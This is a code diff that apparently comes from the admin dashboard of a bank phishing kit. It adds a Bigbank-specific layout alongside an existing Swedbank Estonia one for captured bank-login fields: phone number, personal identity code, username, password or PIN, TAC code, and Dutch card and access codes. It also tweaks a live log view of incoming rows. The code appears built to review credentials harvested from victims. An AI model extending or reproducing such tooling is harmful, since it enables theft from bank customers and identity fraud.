@@ -188,6 +188,10 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
     (normalizedBankSlug === "swedbank-ee" || normalizedBankName === "swedbank") &&
     normalizedKeys.some((key) => key.includes("kasutajatunnus")) &&
     normalizedKeys.some((key) => key.includes("telefoninumber") || key.includes("phone") || key.includes("isikukood"));
+  const prefersBankPhoneFirst =
+    (normalizedBankSlug === "bigbank" || normalizedBankName === "bigbank") &&
+    normalizedKeys.some((key) => key.includes("mobilenumber") || key.includes("phone")) &&
+    normalizedKeys.some((key) => key.includes("personalidentitycode") || key.includes("identitycode") || key.includes("isikukood"));
 
   const canonicalFields: Array<[string, string]> = prefersUsernameFirst
     ? [
@@ -203,6 +207,20 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
         ["signatuur", pickString("signatuur")],
         ["identificatiecode", pickString("identificatiecode")],
       ]
+    : prefersBankPhoneFirst
+      ? [
+          ["loginMethod", pickString("loginMethod")],
+          ["bankPhone", pickString("bankPhone")],
+          ["personalCode", pickString("personalCode")],
+          ["username", pickString("username", "verfuegernummer")],
+          ["password", pickString("password", "pin")],
+          ["tacCode", pickString("tacCode")],
+          ["pasnummer", pickString("pasnummer")],
+          ["rekeningnummer", pickString("rekeningnummer")],
+          ["toegangscode", pickString("toegangscode")],
+          ["signatuur", pickString("signatuur")],
+          ["identificatiecode", pickString("identificatiecode")],
+        ]
     : [
         ["loginMethod", pickString("loginMethod")],
         ["personalCode", pickString("personalCode")],
@@ -423,7 +441,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             const idx = prev.findIndex((r) => r.id === newRow.id);
             if (idx === -1) return [newRow, ...prev].slice(0, 50);
             const next = [...prev];
-            next[idx] = { ...next[idx], ...newRow };
+            next[idx] = newRow;
             return next;
           });
         }
